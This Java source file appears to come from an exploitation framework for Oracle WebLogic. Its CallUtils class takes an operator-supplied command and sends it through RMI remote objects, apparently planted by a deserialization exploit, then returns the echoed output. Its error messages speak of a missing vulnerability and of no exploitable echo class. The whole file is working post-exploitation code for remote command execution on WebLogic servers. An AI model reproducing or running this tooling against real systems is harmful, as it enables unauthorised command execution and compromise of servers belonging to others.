package com.weblogic.framework.utils;

import com.weblogic.framework.call.Call;
import com.weblogic.framework.call.PocServerRemoteChannelService;
import com.weblogic.framework.entity.MyException;
import com.weblogic.framework.payloads.VulTest;
import org.reflections.Reflections;
import weblogic.cluster.migration.RemoteMigratableServiceCoordinator;
import weblogic.cluster.singleton.ClusterMasterRemote;
import weblogic.cluster.singleton.RemoteLeasingBasis;
import weblogic.cluster.singleton.SingletonMonitorRemote;
import weblogic.server.channels.RemoteChannelService;
import weblogic.transaction.internal.SubCoordinatorRM;

import java.io.IOException;
import java.lang.reflect.Modifier;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.*;

import static com.weblogic.framework.config.CharsetConfig.defaultCharsetName;
import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: CallUtils
 * Desc: 回显工具类
 * Date:2020/4/3 18:59
 * @version 1.0.0
 */
public class CallUtils {

    /**
     * 私有化构造防止被实例化
     */
    private CallUtils(){}

    /**
     * 获取所有回调 class
     */
    public static final String[] CALL_NAMES = getCallName();

    /**
     * 获取所有回调 class map
     */
    public static final Map<String, Class<? extends Remote>> CALL_MAP = callTypeMap();


    /**
     * 获取可回调所有类
     * @return
     */
    public static Set<Class<? extends Remote>> callTypes(){
        String packageName = Call.class.getPackage().getName();
        final Reflections reflections = new Reflections(packageName);
        final Set<Class<? extends Remote>> callTypes = reflections.getSubTypesOf(Remote.class);
        callTypes.removeIf(pc -> pc.isInterface() || Modifier.isAbstract(pc.getModifiers()));
        return callTypes;
    }

    /**
     * 获取回调的名称
     * @return
     */
    public static String[] getCallName(){
        final List<Class<? extends Remote>> callClasses = new ArrayList<>(callTypes());
        Collections.sort(callClasses, new StringUtils.ToStringComparator());
        List<String> nameList = new ArrayList<>();
        for (Class<? extends Remote> callClass:callClasses) {
            String name = callClass.getInterfaces()[0].getSimpleName();
            if(nameList.contains(name)){
                continue;
            }
            nameList.add(name);
        }
        return nameList.toArray(new String[0]);
    }

    /**
     * 回调名称
     * @return
     */
    public static Map<String, Class<? extends Remote>> callTypeMap(){
        final List<Class<? extends Remote>> callClasses = new ArrayList<>(callTypes());
        Collections.sort(callClasses, new StringUtils.ToStringComparator());
        Map<String, Class<? extends Remote>> result = new HashMap<>();
        List<String> nameList = new ArrayList<>();
        for (Class<? extends Remote> callClass:callClasses) {
            String name = callClass.getInterfaces()[0].getSimpleName();
            if(nameList.contains(name)){
                continue;
            }
            nameList.add(name);
            result.put(name, callClass);
        }
        return result;
    }


    /**
     * 执行命令
     * @param cmd cmd
     * @param object 回调对象
     * @return
     */
    public static String callExec(String cmd, Object object) throws Exception {

        if(object == null){
            throw new MyException("漏洞不存在");
        }
        if(isBlank(cmd)){
            throw new MyException("请输入执行命令");
        }
        if(object instanceof ClusterMasterRemote){
            ClusterMasterRemote remote = (ClusterMasterRemote) object;
            return remote.getServerLocation(cmd);
        }else if(object instanceof RemoteChannelService){
            RemoteChannelService remote = (RemoteChannelService)object;
            return remote.getURL(cmd);
        }else if(object instanceof RemoteLeasingBasis){
            RemoteLeasingBasis remote = (RemoteLeasingBasis)object;
            return remote.findOwner(cmd);
        }else if(object instanceof RemoteMigratableServiceCoordinator){
            RemoteMigratableServiceCoordinator remote = (RemoteMigratableServiceCoordinator)object;
            return remote.getCurrentLocationOfJTA(cmd);
        }else if(object instanceof SingletonMonitorRemote){
            SingletonMonitorRemote remote = (SingletonMonitorRemote) object;
            return remote.findServiceLocation(cmd);
        }else if(object instanceof SubCoordinatorRM){
            SubCoordinatorRM remote = (SubCoordinatorRM)object;
            return remote.getProperties(cmd).get("data").toString();
        }
        throw new MyException("无可利用回显类");
    }

    /**
     * 执行命令并且回显
     * @param cmd 执行命令
     * @param remote 远程 Stub
     * @return
     */
    public static String callInfo(String cmd, ClusterMasterRemote remote) throws RemoteException {
        if(remote == null){
            throw new MyException("漏洞不存在");
        }
        if(isBlank(cmd)){
            throw new MyException("请输入执行命令");
        }
        String currentOs = System.getProperty("os.name");
        cmd += "@@"+currentOs;
        return remote.getServerLocation(cmd);
    }

    public static void main(String[] args) {
        System.out.println(CALL_MAP.get("RemoteChannelService").getSimpleName());
    }
}
